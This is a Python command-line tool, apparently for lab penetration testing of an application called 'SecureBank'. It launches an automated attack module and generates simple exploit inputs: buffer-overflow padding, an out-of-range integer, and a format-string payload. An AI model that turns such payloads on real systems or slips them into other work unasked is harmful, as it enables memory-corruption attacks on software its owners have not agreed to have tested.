import re
import click
import subprocess as sp

import Exploitation.AutomatedPenTest as auto


@click.group()
@click.version_option(version='0.0.1')
def main():
    """Application for penetration testing of the SecureBank"""
    pass

@main.command()
@click.option('--process',
                help='Process to be attacked')
@click.option('--user-name',
                help='User name of the SecureBank user')
@click.option('--bank-account',
                help='bank account for attacka purposes')
def automated_attack(process, user_name, bank_account):
    """Initiate automated pen test of the application"""
    pattern = re.compile(r"[a-zA-Z]+-[a-zA-Z]+")
    if not re.match(pattern, process):
        click.echo('incorrect format of the process name -> ' + process +', exiting now!')
        exit()
    
    automated_attack = auto.AutomatedPenTest(process, user_name, bank_account)
    automated_attack.begin_pen_test()


@main.command()
@click.option('--count',
                help="Number of As to fill buffer to cause buffer overflow")
def buffer_overflow(count = 0):
    """Command to perform buffer overflow
        eg. python3 ArmorPiercer.py buffer-overflow --count=10
    """
    click.echo('a' * int(count))

@main.command()
@click.option('--int-number',
                help="Number to cause integer overflow. Max value of int in C is +/- 2147483648")
def integer_overflow(int_number=-21474836100):
    """Command to perform integer overflow
        eg. python3 ArmorPiercer.py integer-overflow --int-number=2147483648
    """
    click.echo(int(int_number))

@main.command()
@click.option('--address',
                help='Adress on which the string formating error should be performed')
def string_formating(address = "\xc2\xd8\xff\xff"):
    """Command to perform string formating """
    print(address+"%08x-"*3+"%s")

if __name__ == '__main__':
    main()
